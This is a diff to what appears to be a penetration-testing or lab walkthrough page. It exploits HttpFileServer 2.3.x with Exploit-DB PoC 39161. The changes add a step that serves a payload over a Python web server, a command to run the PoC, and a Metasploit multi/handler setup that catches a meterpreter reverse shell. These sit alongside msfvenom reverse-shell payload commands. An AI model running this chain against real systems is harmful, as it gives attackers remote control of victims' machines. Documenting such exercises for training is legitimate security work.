@@ -16,7 +16,7 @@ $ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp LHOST=<attacker_addr
 ```
 {% endcode %}
 
-_**meterpreter**_
+_**meterpreter payload**_
 
 {% code overflow="wrap" %}
 ```sh
@@ -24,11 +24,17 @@ $ msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe LHOST=10.4.10.179 LPORT
 ```
 {% endcode %}
 
+{% code title="host web server to load payload file" overflow="wrap" %}
+```sh
+$ python3 -m http.server <port>
+```
+{% endcode %}
+
 _**Modified PoC**_
 
 {% embed url="https://www.exploit-db.com/exploits/39161" %}
 
-{% code overflow="wrap" %}
+{% code title="39161.py" overflow="wrap" %}
 ```python
 #!/usr/bin/python
 # Exploit Title: HttpFileServer 2.3.x Remote Command Execution
@@ -89,7 +95,22 @@ except:
 ```
 {% endcode %}
 
+{% code overflow="wrap" %}
+```sh
+$ python2 39161.py <target> <port>
+```
+{% endcode %}
 
+#### Catch meterpreter&#x20;
+
+```sh
+msf6> use multi/handler
+msf6> set payload windows/x64/meterpreter_reverse_tcp
+msf6> set lhost xxxx
+msf6> set lport xxxx
+
+msf6> run
+```
 
 ### Privilege escalation
 
